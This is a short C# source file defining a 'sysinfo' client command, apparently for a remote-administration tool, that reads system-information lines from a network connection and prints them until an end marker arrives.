using System;
using System.Collections.Generic;
using System.Linq;
using System.Management;
using System.Security.Principal;

namespace ClientCommands
{
    internal class SysInfo : ICommand
    {
        public string name { get; } = "sysinfo";

        public string description { get; } = "Display the remote system's informations";

        public string syntaxHelper { get; } = "sysinfo";

        public bool isLocal { get; } = false;

        public List<string> validArguments { get; } = null;


        public bool PreProcess(List<string> args)
        {
            throw new NotImplementedException();
        }

        public void Process(List<string> args)
        {
            var data = "";
            while (data != "{end}")
            {
                if (data != "")
                    Console.WriteLine(data);
                data = ClientCommandsManager.networkManager.ReadLine();
            }
        }
    }
}
